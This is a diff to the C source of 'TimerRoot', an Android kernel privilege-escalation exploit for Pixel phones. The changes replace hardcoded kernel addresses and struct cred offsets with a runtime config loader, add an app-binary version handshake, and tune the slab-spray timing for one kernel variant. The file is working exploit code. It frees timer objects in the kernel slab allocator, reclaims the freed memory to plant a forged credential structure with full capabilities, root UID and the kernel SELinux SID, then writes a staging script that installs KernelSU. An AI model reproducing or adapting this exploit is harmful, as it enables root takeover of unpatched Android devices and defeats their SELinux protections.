@@ -74,15 +74,37 @@
 #define LOCKERS 3
 
 /*
- * Build-dependent constants.  The Pixel 7a (lynx) and the Pixel 9a (tegu)
- * factory boot images carry the same 6.1.162 4K-page kernel, so the 4K
- * profile is shared.  Tegu also ships an optional 16K-page kernel
- * (kernel_16k in its factory image); that image has different text/data
- * addresses and an order-0 posix_timers_cache, so it gets its own profile.
+ * App <-> binary interface version.  Bump it whenever the arguments or the
+ * conf schema change incompatibly, and pass the same value from UserService.
+ * The conf-driven rewrite is protocol 2: an older app starts the binary
+ * without --conf/--protocol, which the binary detects and refuses.
+ */
+#define APP_PROTOCOL 2
+#define EXIT_OLD_APP 78
+
+/*
+ * Zero-terminated form of the protocol handshake, so the app can recognise a
+ * compatible binary by scanning its bytes without executing it.  Keep the
+ * literal "TIMER_PROTOCOL=<n>" shape: UserService searches for it.
+ */
+#define STRINGIFY_(x) #x
+#define STRINGIFY(x) STRINGIFY_(x)
+#define TIMER_PROTOCOL_MARKER "TIMER_PROTOCOL=" STRINGIFY(APP_PROTOCOL)
+
+/*
+ * Build-dependent constants, loaded from a HOCON conf at runtime.
+ *
+ * The conf-driven layout and the per-kernel profiles come from
+ * https://github.com/rikumi/TimerRoot (see the conf directory).  A profile is
+ * selected by the app from `uname -r` plus the userspace page size; the
+ * binary re-checks both before it touches anything so a stale or wrong conf
+ * is refused instead of corrupting the kernel.
  */
 struct target_profile
 {
-    const char *name;
+    char name[96];
+    char release[160];
+    char ksu_kmi[64];
     unsigned long page_size;
     unsigned int page_shift;
     unsigned int slab_order;
@@ -101,6 +123,7 @@ struct target_profile
     unsigned long long linear_max;
     /* cred/task_struct layout (BTF). */
     unsigned long long cred_uid_off;
+    unsigned long long cred_euid_off;
     unsigned long long cred_req;
     unsigned long long cred_alloc;
     unsigned long long cred_size;
@@ -113,56 +136,21 @@ struct target_profile
     unsigned long long fake_user_ns_off;
     unsigned long long fake_ucounts_off;
     unsigned long long fake_groups_off;
+    int cred_cap_count;
+    /* Build-specific pieces that used to be #defines. */
+    unsigned long long timer_alloc;
+    unsigned long long task_alloc_bytes;
+    unsigned long long fullcap;
+    unsigned long long selinux_blob_off;
+    unsigned long long selinux_sid_kernel;
+    /* Pixel android14-6.1 frees order-1 slab pages through the PCP lists
+     * and emits no mm_page_free event; gate the spray on slabinfo then. */
+    int pcp_free;
 };
 
-/* lynx 6.1.162, 4K pages (also used by tegu's stock boot.img).
- * do_timer_create+0xa8; posix_timers_cache object_size 264 (0x108),
- * order-1 slab, 31 objects.  cred is 0xb0 with a 4-byte usage. */
-static const struct target_profile profile_4k = {
-    "4k", 4096UL, 12, 1, 8192UL,
-    0xffffffc008192f7cULL, 0x192f7cULL,
-    0xffffffc00a25b448ULL, 0xffffffc00a00ac08ULL,
-    0xac068ULL,
-    0xffffffc00a0305c0ULL, 0xffffffc00a030330ULL,
-    0xffffffc00a031e48ULL, 0xffffffc00a0318e0ULL,
-    0xffffff0000000000ULL, 0xffffffc000000000ULL,
-    0x4ULL, 0xb0ULL, 0xc0ULL, 0xb0ULL, 0x838ULL,
-    0x18ULL, 0x28ULL, 0x78ULL, 0x80ULL, 0x88ULL, 0x90ULL, 0x98ULL,
-};
-
-/* tegu kernel_16k, 16K pages.
- * do_timer_create+0xa8 = 0xffffc00008193088; posix_timers_cache is
- * order-0 (16K) with 62 objects, so the reclaim channel is 16 KiB too. */
-static const struct target_profile profile_16k = {
-    "16k", 16384UL, 14, 0, 16384UL,
-    0xffffc00008193088ULL, 0x193088ULL,
-    0xffffc0000a362458ULL, 0xffffc0000a0f0c08ULL,
-    0xabfd8ULL,
-    0xffffc0000a1195c0ULL, 0xffffc0000a119330ULL,
-    0xffffc0000a11ae48ULL, 0xffffc0000a11a8e0ULL,
-    0xffff000000000000ULL, 0xffffc00000000000ULL,
-    0x4ULL, 0xb0ULL, 0xc0ULL, 0xb0ULL, 0x838ULL,
-    0x18ULL, 0x28ULL, 0x78ULL, 0x80ULL, 0x88ULL, 0x90ULL, 0x98ULL,
-};
-
-/* Pixel 10 series (frankel/blazer/mustang/rango), 6.6.127, 4K pages.
- * do_timer_create+0xa8 = 0xffffffc080195bac; the task_struct alloc in
- * copy_process returns to 0xffffffc0800ab8bc.  posix_timers_cache is
- * order-1/264 bytes again, but cred grew to 0xb8 (8-byte usage) and
- * task_struct.cred moved to 0x820. */
-static const struct target_profile profile_6_6 = {
-    "6.6-4k", 4096UL, 12, 1, 8192UL,
-    0xffffffc080195bacULL, 0x195bacULL,
-    0xffffffc08237a0e8ULL, 0xffffffc08212ac0cULL,
-    0xab8bcULL,
-    0xffffffc08214efe0ULL, 0xffffffc08214ed50ULL,
-    0xffffffc082150ab0ULL, 0xffffffc082150540ULL,
-    0xffffff0000000000ULL, 0xffffffc000000000ULL,
-    0x8ULL, 0xb8ULL, 0xc0ULL, 0xb8ULL, 0x820ULL,
-    0x18ULL, 0x30ULL, 0x80ULL, 0x88ULL, 0x90ULL, 0x98ULL, 0xa0ULL,
-};
-
-static const struct target_profile *g_tgt;
+static struct target_profile g_cfg;
+static const struct target_profile *g_tgt = &g_cfg;
+static int g_conf_overflow;
 static char g_device[128] = "unknown";
 static char g_kernel[256] = "unknown";
 
@@ -187,7 +175,7 @@ static char g_kernel[256] = "unknown";
 #define INIT_GROUPS_STATIC (g_tgt->init_groups_static)
 
 /* cred_jar: sizeof(struct cred) and kmem_cache size, from BTF. */
-#define TIMER_ALLOC 0x108ULL
+#define TIMER_ALLOC (g_tgt->timer_alloc)
 #define CRED_REQ (g_tgt->cred_req)
 #define CRED_ALLOC (g_tgt->cred_alloc)
 #define CRED_SIZE (g_tgt->cred_size)
@@ -196,13 +184,14 @@ static char g_kernel[256] = "unknown";
 
 /* task_struct / cred layout (BTF). */
 #define OFF_TASK_CRED (g_tgt->task_cred_off)
-#define TASK_ALLOC_BYTES 0x12c0ULL
-#define FULLCAP 0x1ffffffffffULL
+#define TASK_ALLOC_BYTES (g_tgt->task_alloc_bytes)
+#define FULLCAP (g_tgt->fullcap)
 
-/* SELinux is the only LSM using a cred blob here; fill 32 bytes to cover
- * blob offset 0 (this target) and 8 (other 6.1 LSM orderings). */
-#define SELINUX_BLOB_OFF 0x0ULL
-#define SELINUX_SID_KERNEL 1U
+/* SELinux is the only LSM using a cred blob here; fill 32 bytes from the
+ * conf's blob offset.  Offset 0 (the default for these profiles) covers both
+ * the 0x0 and 0x8 field orderings in one write. */
+#define SELINUX_BLOB_OFF (g_tgt->selinux_blob_off)
+#define SELINUX_SID_KERNEL ((unsigned)g_tgt->selinux_sid_kernel)
 /*
  * Fake cred offset from the stale rb_node.
  *
@@ -247,6 +236,205 @@ static char g_kernel[256] = "unknown";
 #define FAKE_USER_NS_OFF (g_tgt->fake_user_ns_off)
 #define FAKE_UCOUNTS_OFF (g_tgt->fake_ucounts_off)
 #define FAKE_GROUPS_OFF (g_tgt->fake_groups_off)
+
+/*
+ * HOCON conf loader.  JSON is a subset, so `key = value` lines are enough;
+ * `#` and `//` comments are stripped.  The field names are the ones used by
+ * rikumi/TimerRoot's conf/ directory.
+ */
+static void conf_defaults(void)
+{
+    memset(&g_cfg, 0, sizeof(g_cfg));
+    /* Defaults describe the 6.6/6.12 cred layout and a 4K/order-1 slab.
+     * A 6.1 profile overrides every cred offset explicitly. */
+    g_cfg.page_size = 4096;
+    g_cfg.page_shift = 12;
+    g_cfg.slab_order = 1;
+    g_cfg.slab_size = 8192;
+    g_cfg.linear_min = 0xffffff0000000000ULL;
+    g_cfg.linear_max = 0xffffffc000000000ULL;
+    g_cfg.fake_security_off = 0x80;
+    g_cfg.fake_user_off = 0x88;
+    g_cfg.fake_user_ns_off = 0x90;
+    g_cfg.fake_ucounts_off = 0x98;
+    g_cfg.fake_groups_off = 0xa0;
+    g_cfg.cred_euid_off = 0x18;
+    g_cfg.fake_caps_off = 0x30;
+    g_cfg.cred_cap_count = 5;
+    g_cfg.fake_cred_off = 0x18;
+    g_cfg.timer_alloc = 0x108;
+    g_cfg.task_alloc_bytes = 0x12c0;
+    g_cfg.fullcap = 0x1ffffffffffULL;
+    g_cfg.selinux_blob_off = 0x0;
+    g_cfg.selinux_sid_kernel = 1;
+    g_conf_overflow = 0;
+}
+
+static void parse_conf_line(char *line)
+{
+    char *p, *key, *val, *hash, *slash;
+    unsigned long long num;
+
+    hash = strchr(line, '#');
+    if (hash)
+        *hash = '\0';
+    slash = strstr(line, "//");
+    if (slash)
+        *slash = '\0';
+
+    key = line;
+    while (*key == ' ' || *key == '\t')
+        key++;
+    val = strchr(key, '=');
+    if (!val)
+        return;
+    *val = '\0';
+    val++;
+    for (p = key + strlen(key) - 1; p >= key && (*p == ' ' || *p == '\t'); p--)
+        *p = '\0';
+    while (*val == ' ' || *val == '\t')
+        val++;
+    if (!*val)
+        return;
+
+    if (*val == '"')
+    {
+        char *end = strchr(val + 1, '"');
+        if (!end)
+            return;
+        *end = '\0';
+        val++;
+        if (!strcmp(key, "release"))
+            snprintf(g_cfg.release, sizeof(g_cfg.release), "%s", val);
+        else if (!strcmp(key, "ksu_kmi"))
+            snprintf(g_cfg.ksu_kmi, sizeof(g_cfg.ksu_kmi), "%s", val);
+        return;
+    }
+
+    errno = 0;
+    num = strtoull(val, NULL, 0);
+    if (errno == ERANGE)
+    {
+        fprintf(stderr,
+                "[-] conf value for '%s' does not fit in 64 bits: %s"
+                " (a kernel virtual address is 16 hex digits)\n",
+                key, val);
+        g_conf_overflow = 1;
+        return;
+    }
+
+    if (!strcmp(key, "timer_site")) g_cfg.static_timer_site = num;
+    else if (!strcmp(key, "timer_alloc")) g_cfg.timer_alloc = num;
+    else if (!strcmp(key, "cred_req")) g_cfg.cred_req = num;
+    else if (!strcmp(key, "cred_alloc")) g_cfg.cred_alloc = num;
+    else if (!strcmp(key, "cred_size")) g_cfg.cred_size = num;
+    else if (!strcmp(key, "cred_uid_off")) g_cfg.cred_uid_off = num;
+    else if (!strcmp(key, "cred_euid_off")) g_cfg.cred_euid_off = num;
+    else if (!strcmp(key, "cred_security_off")) g_cfg.fake_security_off = num;
+    else if (!strcmp(key, "cred_user_off")) g_cfg.fake_user_off = num;
+    else if (!strcmp(key, "cred_userns_off")) g_cfg.fake_user_ns_off = num;
+    else if (!strcmp(key, "cred_ucounts_off")) g_cfg.fake_ucounts_off = num;
+    else if (!strcmp(key, "cred_group_off")) g_cfg.fake_groups_off = num;
+    else if (!strcmp(key, "fake_cred_off")) g_cfg.fake_cred_off = num;
+    else if (!strcmp(key, "cred_cap_off")) g_cfg.fake_caps_off = num;
+    else if (!strcmp(key, "cred_cap_count")) g_cfg.cred_cap_count = (int)num;
+    else if (!strcmp(key, "selinux_state")) g_cfg.selinux_state_static = num;
+    else if (!strcmp(key, "panic_on_warn")) g_cfg.panic_on_warn_static = num;
+    else if (!strcmp(key, "task_cred_off")) g_cfg.task_cred_off = num;
+    else if (!strcmp(key, "copy_process_low21")) g_cfg.copy_process_low21 = num;
+    else if (!strcmp(key, "task_alloc_bytes")) g_cfg.task_alloc_bytes = num;
+    else if (!strcmp(key, "fullcap")) g_cfg.fullcap = num;
+    else if (!strcmp(key, "root_user")) g_cfg.root_user_static = num;
+    else if (!strcmp(key, "init_user_ns")) g_cfg.init_user_ns_static = num;
+    else if (!strcmp(key, "init_ucounts")) g_cfg.init_ucounts_static = num;
+    else if (!strcmp(key, "init_groups")) g_cfg.init_groups_static = num;
+    else if (!strcmp(key, "selinux_blob_off")) g_cfg.selinux_blob_off = num;
+    else if (!strcmp(key, "selinux_sid_kernel")) g_cfg.selinux_sid_kernel = num;
+    else if (!strcmp(key, "page_size")) g_cfg.page_size = (unsigned long)num;
+    else if (!strcmp(key, "page_shift")) g_cfg.page_shift = (unsigned int)num;
+    else if (!strcmp(key, "slab_order")) g_cfg.slab_order = (unsigned int)num;
+    else if (!strcmp(key, "slab_size")) g_cfg.slab_size = (unsigned long)num;
+    else if (!strcmp(key, "linear_min")) g_cfg.linear_min = num;
+    else if (!strcmp(key, "linear_max")) g_cfg.linear_max = num;
+    else if (!strcmp(key, "pcp_free")) g_cfg.pcp_free = (int)num;
+}
+
+/* A kernel release may or may not carry the "-4k" userspace suffix. */
+static int release_matches(const char *a, const char *b)
+{
+    size_t la = strlen(a), lb = strlen(b);
+
+    if (!strcmp(a, b))
+        return 1;
+    if (la > 3 && !strcmp(a + la - 3, "-4k"))
+        la -= 3;
+    if (lb > 3 && !strcmp(b + lb - 3, "-4k"))
+        lb -= 3;
+    return la == lb && !strncmp(a, b, la);
+}
+
+static int load_conf(const char *path)
+{
+    FILE *f;
+    char line[512];
+    const char *base;
+
+    conf_defaults();
+    f = fopen(path, "r");
+    if (!f)
+    {
+        fprintf(stderr, "[-] cannot open conf: %s\n", path);
+        return -1;
+    }
+    while (fgets(line, sizeof(line), f))
+        parse_conf_line(line);
+    fclose(f);
+
+    if (g_conf_overflow)
+        return -1;
+    if (!g_cfg.static_timer_site || !g_cfg.selinux_state_static ||
+        !g_cfg.task_cred_off || !g_cfg.copy_process_low21 ||
+        !g_cfg.task_alloc_bytes || !g_cfg.ksu_kmi[0] || !g_cfg.cred_req ||
+        !g_cfg.cred_alloc || !g_cfg.root_user_static ||
+        !g_cfg.init_user_ns_static || !g_cfg.init_ucounts_static ||
+        !g_cfg.init_groups_static || !g_cfg.fake_security_off ||
+        !g_cfg.fake_user_off || !g_cfg.fake_user_ns_off ||
+        !g_cfg.fake_ucounts_off || !g_cfg.fake_groups_off ||
+        !g_cfg.fake_cred_off || !g_cfg.fake_caps_off ||
+        g_cfg.cred_cap_count <= 0)
+    {
+        fprintf(stderr, "[-] conf missing required fields: %s\n", path);
+        return -1;
+    }
+    if (!g_cfg.cred_size)
+        g_cfg.cred_size = g_cfg.cred_req;
+    g_cfg.timer_site_low21 = g_cfg.static_timer_site & 0x1fffffULL;
+
+    if (g_cfg.release[0] && !release_matches(g_cfg.release, g_kernel))
+    {
+        fprintf(stderr, "[-] conf release mismatch: conf=%s running=%s\n",
+                g_cfg.release, g_kernel);
+        return -1;
+    }
+    if (g_cfg.page_size != (unsigned long)sysconf(_SC_PAGESIZE))
+    {
+        fprintf(stderr,
+                "[-] conf page size mismatch: conf=%lu running=%ld\n",
+                g_cfg.page_size, sysconf(_SC_PAGESIZE));
+        return -1;
+    }
+    if (!g_cfg.page_size || !g_cfg.slab_size ||
+        (g_cfg.page_size & (g_cfg.page_size - 1)) ||
+        (g_cfg.slab_size & (g_cfg.slab_size - 1)))
+    {
+        fprintf(stderr, "[-] conf page/slab size is not a power of two\n");
+        return -1;
+    }
+
+    base = strrchr(path, '/');
+    snprintf(g_cfg.name, sizeof(g_cfg.name), "%s", base ? base + 1 : path);
+    return 0;
+}
 
 #define CHILD_HELLO 0x52445931
 #define CHILD_MAGIC 0x50474552
@@ -296,6 +484,30 @@ static void slab_usage(const char *tag)
         break;
     }
     fclose(f);
+}
+
+/* posix_timers_cache active object count, or -1 when unreadable. */
+static long slab_active(void)
+{
+    FILE *f = fopen("/proc/slabinfo", "r");
+    char line[256];
+    long r = -1;
+
+    if (!f)
+        return -1;
+    while (fgets(line, sizeof(line), f))
+    {
+        if (!strncmp(line, "posix_timers_cache", 18))
+        {
+            unsigned active = 0, total = 0;
+
+            if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
+                r = (long)active;
+            break;
+        }
+    }
+    fclose(f);
+    return r;
 }
 
 /*
@@ -1074,13 +1286,13 @@ static void build_payload(unsigned char *buf, size_t off,
 /* GhostLock's final stage, reduced to its root-child handoff. */
 static void write_ksu_script(void)
 {
-    static const char script[] =
+    static const char script_head[] =
         "#!/system/bin/sh\n"
         "echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n"
         "grep -E '^(Cap|Seccomp)' /proc/self/status\n"
         /* Try upstream KernelSU, KernelSU-Next and SukiSU Ultra first. */
-        "PKGS='me.weishu.kernelsu com.rifsxd.ksunext com.sukisu.ultra'\n"
-        "KMI=android14-6.1\n"
+        "PKGS='me.weishu.kernelsu com.rifsxd.ksunext com.sukisu.ultra'\n";
+    static const char script_tail[] =
         "KSUD=''\n"
         "PKG=''\n"
         "APK=''\n"
@@ -1245,7 +1457,11 @@ static void write_ksu_script(void)
 
     if (fd < 0)
         return;
-    (void)!write(fd, script, sizeof(script) - 1);
+    (void)!write(fd, script_head, sizeof(script_head) - 1);
+    (void)!write(fd, "KMI=", 4);
+    (void)!write(fd, g_cfg.ksu_kmi, strlen(g_cfg.ksu_kmi));
+    (void)!write(fd, "\n", 1);
+    (void)!write(fd, script_tail, sizeof(script_tail) - 1);
     close(fd);
     (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
 }
@@ -1430,6 +1646,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
 {
     unsigned long long ptrs[NTIMERS];
     unsigned long long pfn = 0, slab_pfn = 0;
+    long slab_base = -1;
     unsigned char *payload = NULL;
     pthread_t th[SPRAY_THREADS];
     struct spray_arg args[SPRAY_THREADS];
@@ -1741,6 +1958,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
      * allocations split/take the page first, which permanently loses the
      * plant.  Phase 2 still starts when the free is seen in the trace.
      */
+    if (g_cfg.pcp_free)
+        slab_base = slab_active();
     atomic_store(&g_burst, 1);
     if (g_timer_go_w >= 0)
     {
@@ -1794,7 +2013,25 @@ static void run_plant(unsigned long long target, int tag, int mode,
      * are in flight no matter exactly when the free lands; the cleared
      * trace ring makes any later page_free event unambiguous, and the scan
      * below still releases phase 2 if it has not started yet.
+     *
+     * Pixel android14-6.1 (pcp_free) is the exception: order-1 slab frees
+     * go through the PCP lists and emit no mm_page_free event, so gate the
+     * burst on /proc/slabinfo showing the victim's timers actually freed.
      */
+    if (g_cfg.pcp_free)
+    {
+        long t0 = now_ms();
+        long now = slab_base;
+
+        while (slab_base > 0 && now > 0 &&
+               now > slab_base - 2000 && now_ms() - t0 < 30000)
+        {
+            usleep(200000);
+            now = slab_active();
+        }
+        logf("[+] plant%d pcp reclaim go (slab %ld -> %ld, %ldms)\n",
+             tag, slab_base, now, now_ms() - t0);
+    }
     atomic_store(&g_burst2, 1);
     long t1 = now_ms();
     int hit = 0;
@@ -2230,83 +2467,73 @@ static int wait_child_main(const char *mode)
     _exit(5);
 }
 
-/*
- * Pick the build profile from the running device.  The stock Pixel 7a
- * (lynx) and Pixel 9a (tegu) boot images share the same 6.1.162 4K
- * kernel, so they use profile_4k.  Tegu also ships a 16K-page kernel
- * in its factory image; the userspace page size picks that one.  The
- * Pixel 10 series ships a 6.6.127 4K kernel with a different cred and
- * task_struct layout, selected by the kernel banner.
- */
-static void detect_target(void)
+static void detect_device(void)
 {
     struct utsname u;
     char dev[PROP_VALUE_MAX];
-    long ps;
 
-    g_tgt = &profile_4k;
     if (uname(&u) == 0)
         snprintf(g_kernel, sizeof(g_kernel), "%s", u.release);
 
     dev[0] = '\0';
     if (__system_property_get("ro.product.device", dev) > 0 && dev[0])
         snprintf(g_device, sizeof(g_device), "%s", dev);
+}
 
-    ps = sysconf(_SC_PAGESIZE);
-    if (strstr(g_kernel, "6.6.127-android15-8-g91d825611104-ab16252310"))
-        g_tgt = &profile_6_6;
-    else if (ps == 16384)
-        g_tgt = &profile_16k;
+static void print_usage(const char *argv0)
+{
+    fprintf(stderr,
+            "usage: %s --conf <conf> [--protocol N]"
+            " [ids|leak|shell|fake|permissive] [target|probe|cpu N]\n",
+            argv0 ? argv0 : "timer");
+}
 
-    logf("[+] device=%s kernel=%s pagesize=%ld profile=%s\n",
-         g_device, g_kernel, ps, g_tgt->name);
+/*
+ * The app and the binary are shipped separately: the app can download a new
+ * timer without being updated itself.  Older apps start the binary without
+ * --conf (and without --protocol), which would otherwise make it run a plant
+ * with the wrong/absent kernel profile.  Refuse loudly instead so the log the
+ * old app displays tells the user to update TimerRoot.
+ */
+static void old_app_notice(int app_protocol)
+{
+    logf("\n");
+    logf("============================================================\n");
+    logf("[!] BREAKING CHANGE: TimerRoot app is too old\n");
+    logf("[!] OLD_APP_DETECTED app_protocol=%d required=%d\n",
+         app_protocol, APP_PROTOCOL);
+    /*
+     * Machine-readable handshake.  The app probes an installed binary by
+     * scanning for this literal, so it must stay a real string constant.
+     */
+    logf("[!] %s\n", TIMER_PROTOCOL_MARKER);
+    logf("============================================================\n");
+    logf("This timer build reads its kernel constants from conf files and\n");
+    logf("must be started with --conf and --protocol. The app that started\n");
+    logf("it did not, so it predates the conf-driven update.\n");
+    logf("\n");
+    logf("Update TimerRoot to the latest version, then install the exploit\n");
+    logf("again with \"Download exploit\" (or Prepare).\n");
+    logf("Refusing to run without a profile: doing so could panic the kernel.\n");
+    logf("============================================================\n");
 }
 
 int main(int argc, char **argv)
 {
     unsigned char *raw;
     int shell_mode = 0, leak_only = 0, ids_only = 0;
+    const char *conf_path = NULL, *mode = NULL;
+    int app_protocol = 0;
+    int argi = 1;
 
     setvbuf(stdout, NULL, _IONBF, 0);
     log_open();
     logf("=== start pid=%d argc=%d argv0=\"%s\" argv1=\"%s\" ===\n",
          getpid(), argc,
          argc > 0 && argv[0] ? argv[0] : "(null)",
-         argc > 1 && argv[1] ? argv[1] : "(none)");
+         argc > 1 ? argv[1] : "(none)");
     if (argc > 1 && !strcmp(argv[1], "wait"))
         return wait_child_main(argc > 2 ? argv[2] : "verify");
-
-    detect_target();
-    /* Lets the app confirm a downloaded binary targets this exact build.
-     * Keep target=lynx for the app's existing check; device picks the
-     * actual profile (Pixel 7a/9a/10, 4K or 16K kernel). */
-    if (argc > 1 && !strcmp(argv[1], "target"))
-    {
-        printf("target=lynx\ndevice=%s\nkernel=%s\npagesize=%lu\n"
-               "profile=%s\ntimer_site=%#llx\n",
-               g_device, g_kernel, (unsigned long)PAGE, g_tgt->name,
-               (unsigned long long)STATIC_TIMER_SITE);
-        return 0;
-    }
-
-    if (argc > 1 && !strcmp(argv[1], "shell"))
-        shell_mode = 1;
-    if (argc > 1 && !strcmp(argv[1], "leak"))
-        leak_only = 1;
-    if (argc > 1 && !strcmp(argv[1], "permissive"))
-        g_selinux_target = 1;
-    if (argc > 1 && !strcmp(argv[1], "ids"))
-        ids_only = 1;
-    if (argc > 1 && !strcmp(argv[1], "probe"))
-        g_probe = 1;
-    if (argc > 1 && !strcmp(argv[1], "fake"))
-        g_fake_stage = 1;
-
-    raw = malloc(48u << 20);
-    if (!raw)
-        return 1;
-    if (argc > 2 && !strcmp(argv[1], "cpu"))
-        g_cpu = atoi(argv[2]);
 
     /*
      * The trigger re-execs this binary with argv[0]="" purely to consume the
@@ -2324,6 +2551,88 @@ int main(int argc, char **argv)
             ;
         _exit(42);
     }
+
+    detect_device();
+
+    while (argi < argc)
+    {
+        if (!strcmp(argv[argi], "--conf"))
+        {
+            if (argi + 1 >= argc)
+            {
+                print_usage(argv[0]);
+                return 1;
+            }
+            conf_path = argv[argi + 1];
+            argi += 2;
+        }
+        else if (!strcmp(argv[argi], "--protocol"))
+        {
+            if (argi + 1 >= argc)
+            {
+                print_usage(argv[0]);
+                return 1;
+            }
+            app_protocol = atoi(argv[argi + 1]);
+            argi += 2;
+        }
+        else
+        {
+            break;
+        }
+    }
+    if (argi < argc)
+        mode = argv[argi++];
+
+    if (mode)
+    {
+        if (!strcmp(mode, "shell"))
+            shell_mode = 1;
+        else if (!strcmp(mode, "leak"))
+            leak_only = 1;
+        else if (!strcmp(mode, "permissive"))
+            g_selinux_target = 1;
+        else if (!strcmp(mode, "ids"))
+            ids_only = 1;
+        else if (!strcmp(mode, "probe"))
+            g_probe = 1;
+        else if (!strcmp(mode, "fake"))
+            g_fake_stage = 1;
+        else if (!strcmp(mode, "cpu") && argi < argc)
+            g_cpu = atoi(argv[argi]);
+    }
+
+    /*
+     * A missing conf means an old app.  A protocol that is present but below
+     * APP_PROTOCOL catches a build that learned --conf before this handshake.
+     * Protocol 0 is a manual `--conf <file>` invocation (used for probing),
+     * which is allowed.
+     */
+    if (!conf_path || (app_protocol > 0 && app_protocol < APP_PROTOCOL))
+    {
+        old_app_notice(app_protocol);
+        return EXIT_OLD_APP;
+    }
+    if (load_conf(conf_path))
+        return 1;
+    logf("[+] device=%s kernel=%s pagesize=%ld profile=%s conf=%s\n",
+         g_device, g_kernel, sysconf(_SC_PAGESIZE), g_tgt->name, conf_path);
+
+    /* Lets the app confirm a downloaded binary targets this exact build.
+     * Keep target=lynx for the app's existing check. */
+    if (mode && !strcmp(mode, "target"))
+    {
+        printf("target=lynx\ndevice=%s\nkernel=%s\npagesize=%lu\n"
+               "profile=%s\nconf=%s\ntimer_site=%#llx\nprotocol=%d\n%s\n",
+               g_device, g_kernel, (unsigned long)PAGE, g_tgt->name,
+               conf_path, (unsigned long long)STATIC_TIMER_SITE,
+               APP_PROTOCOL, TIMER_PROTOCOL_MARKER);
+        return 0;
+    }
+
+    raw = malloc(48u << 20);
+    if (!raw)
+        return 1;
 
     {
         struct rlimit rl;
